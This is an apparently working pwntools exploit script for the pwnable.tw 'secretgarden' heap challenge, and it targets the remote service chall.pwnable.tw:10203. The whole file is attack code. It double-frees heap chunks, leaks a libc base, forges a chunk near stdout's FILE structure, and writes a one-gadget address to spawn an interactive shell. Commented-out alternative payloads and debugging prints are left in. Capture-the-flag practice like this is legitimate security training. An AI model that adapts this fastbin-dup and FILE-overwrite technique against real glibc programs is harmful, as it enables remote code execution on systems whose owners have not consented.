from pwn import *

context.log_level='debug'

s=process('./secretgarden',env={'LD_PRELOAD':'/home/zj3t/libc-2.24.so'}) #server libc
s=remote('chall.pwnable.tw',10203)
e=ELF('./secretgarden')
l=ELF('/lib/x86_64-linux-gnu/libc.so.6')

def Raise_flower(length,name,color):
    print s.recvuntil('Your choice :')
    s.sendline('1')
    print s.recvuntil('Length of the name :')
    s.sendline(str(length))
    print s.recvuntil('The name of flower :')
    s.send(name)
    print s.recvuntil('The color of the flower :')
    s.sendline(color)

def Visit_garden(until):
    print s.recvuntil('Your choice :')
    s.sendline('2')
    print s.recvuntil(until)

def Remove_flower(choice):
    print s.recvuntil('Your choice :')
    s.sendline('3')
    print s.recvuntil('Which flower do you want to remove from the garden:')
    s.sendline(str(choice))

def Clean_garden():
    print s.recvuntil('Your choice :')
    s.sendline('4')


if __name__ =='__main__':
    
    Raise_flower(90,'A'*30,'a'*20)
    Raise_flower(90,'B'*30,'b'*20)
    Raise_flower(111140,'C'*30,'c'*20) #To leak libc addr
    Raise_flower(90,'D'*40,'d'*23)

    Remove_flower(2)
    Raise_flower(40,'A'*8,'a'*8)
    Visit_garden('Name of the flower[4] :AAAAAAAA')

    libc_leak=u64(s.recv(8))-0x430a000000000000
    libc_base=libc_leak-3939160
    libc_base=libc_base-0x2020
    local_oneshot=libc_base+0x0000000000045581
    remote_oneshot=libc_base+0x000000000004526a
    __free_hook_addr=libc_base+l.symbols['__free_hook']
    
    #stdout=libc_base+l.symbols['stdout']
    
    stdout=libc_base+3941888
    stdout=libc_base+0x3c4620 #server

    Fake_chunk=stdout-0x4200

    raw_input()
    #s.recv(1024)

    Remove_flower(1)
    Remove_flower(0)
    Remove_flower(2)
    Remove_flower(1)

    #Raise_flower(90,p64(Fake_chunk-0x10-0x3),'e'*20)
    Raise_flower(90,p64(stdout+0x40+0x5d),'e'*20)
    #Raise_flower(90,p64(Fake_chunk+0xd),'e'*20)
    Raise_flower(90,'F'*30,'f'*20)
    Raise_flower(90,'G'*30,'g'*20)
    
    raw_input('Final')
    #Raise_flower(90,"\x00"*3+"\x00"*16+'\xff'*4+'\x00'*20+p64(local_oneshot-0x38),'z'*20)
    #Raise_flower(90,"\x00"*3+"\x00"*16+'\xff'*4+'\x00'*20+p64(remote_oneshot-0x38),'z'*20)
    #Raise_flower(90,"\x00"*3+'\x00'*8+p64(remote_oneshot)+'\xff'*4+'\x00'*20+p64(stdout-0x38+160+24),'\n')

    raw_input('re')
    print s.recvuntil('Your choice :')
    s.sendline('1')
    print s.recvuntil('Length of the name :')
    s.sendline('90')
    print s.recvuntil('The name of flower :')
    s.sendline("\x00"*3+'\x00'*8+p64(remote_oneshot)+'\xff'*4+'\x00'*20+p64(stdout-0x38+160+24)+'\x00')
    
    print "\n"
    print "[*]****************************************[*]"
    print "libc_leak: "+str(hex(libc_leak))
    print "libc_base: "+str(hex(libc_base))
    print "local_oneshot: "+str(hex(local_oneshot))
    print "remote_oneshot: "+str(hex(remote_oneshot))
    print "__free_hook_addr: "+str(hex(__free_hook_addr))
    print "stdout: "+str(hex(stdout))
    print "[*]****************************************[*]"

    s.interactive()

